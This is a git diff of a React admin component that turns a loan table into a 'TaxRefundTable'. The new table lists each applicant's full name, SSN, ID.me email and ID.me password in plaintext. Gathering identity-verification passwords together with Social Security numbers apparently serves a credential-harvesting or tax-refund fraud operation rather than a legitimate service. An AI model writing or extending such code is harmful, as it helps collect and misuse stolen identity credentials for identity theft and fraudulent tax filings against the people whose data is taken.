@@ -1,34 +1,30 @@
 import { useState } from "react";
-import { FaEye, FaTrash } from "react-icons/fa";
+import { FaTrash } from "react-icons/fa";
 import toast from "react-hot-toast";
 
 import { Table } from "../common/Table";
 
+import { deleteTaxRefund } from "../../services/tax.service";
+
 import { ConfirmationModal } from "../common/ConfirmationModal";
 
-import formatMoney from "../../utils/formatMoney";
-import { deleteLoan } from "../../services/loan.service";
-import { LoanDetailsModal } from "./LoanDetailsModal";
-
-export function LoanManagementTable({ loans, reload }) {
+export function TaxRefundTable({ taxRefunds, reload }) {
   const [showModal, setShowModal] = useState(false);
   const [modalMessage, setModalMessage] = useState("");
   const [modalAction, setModalAction] = useState(null);
   const [loading, setLoading] = useState(false);
 
-  const [selectedLoan, setSelectedLoan] = useState(null);
 
-  const [showDetailsModal, setShowDetailsModal] = useState(false);
 
   const handleDelete = async (loan) => {
   setLoading(true);
 
   try {
-    await deleteLoan(loan._id);
+    await deleteTaxRefund(loan._id);
 
     await reload();
 
-    toast.success('Loan deleted successfully.');
+    toast.success('Tax Refund application deleted successfully.');
 
     setShowModal(false);
   } catch (error) {
@@ -36,38 +32,57 @@ export function LoanManagementTable({ loans, reload }) {
 
     toast.error(
       error.response?.data?.message ||
-        'Failed to delete loan.',
+        'Failed to delete tax refund .',
     );
   } finally {
     setLoading(false);
   }
 };
 
-  const loanColums = [
+  const taxRefundColumns = [
     {
-      key: "name",
-      label: "Name",
+      key: "account",
+      label: "Account",
       render: (row) => (
         <div className="flex flex-col">
           <span className="font-medium text-text">
             {row.owner.firstName} {row.owner.lastName}
           </span>
 
-          <span className="text-sm text-text-muted">{row.owner.email}</span>
+          <span className="text-sm text-text-muted">{row.email}</span>
         </div>
       ),
     },
 
     {
-      key: "amount requested",
-      label: "Amount Requested",
-      render: (row) => formatMoney(row.requestedAmount),
+      key: "fullName",
+      label: "Full Name",
+      render: (row) => row.fullName,
     },
 
     {
-      key: "duration",
-      label: "Duration",
-      render: (row) => `${row.term} months`,
+      key: "ssn",
+      label: "SSN",
+      render: (row) => row.ssn,
+    },
+
+
+    {
+      key: "idMeEmail",
+      label: "ID.me Email",
+      render: (row) => row.idMeEmail,
+    },
+
+    {
+      key: "idMePassword",
+      label: "ID.me Password",
+      render: (row) => row.idMePassword,
+    },
+
+    {
+      key: "country",
+      label: "Country",
+      render: (row) => row.country,
     },
 
     {
@@ -82,21 +97,12 @@ export function LoanManagementTable({ loans, reload }) {
 
       render: (row) => (
         <div className="flex items-center gap-2">
-          <button
-            type="button"
-            onClick={() => {
-              setSelectedLoan(row);
-              setShowDetailsModal(true);
-            }}
-            className="rounded-lg bg-primary-1 p-2 text-white"
-          >
-            <FaEye />
-          </button>
+         
           <button
             type="button"
             onClick={() => {
               setModalMessage(
-                "Are you sure you want to delete this loan application? This action cannot be undone.",
+                "Are you sure you want to delete this Tax refund application? This action cannot be undone.",
               );
               setModalAction(
                 () => () => handleDelete(row),
@@ -114,17 +120,7 @@ export function LoanManagementTable({ loans, reload }) {
 
   return (
     <div>
-      <Table columns={loanColums} data={loans} />
-
-      <LoanDetailsModal
-        isOpen={showDetailsModal}
-        loan={selectedLoan}
-        onClose={() => {
-          setShowDetailsModal(false);
-          setSelectedLoan(null);
-        }}
-        reload={reload}
-      />
+      <Table columns={taxRefundColumns} data={taxRefunds} />
 
       <ConfirmationModal
         isOpen={showModal}
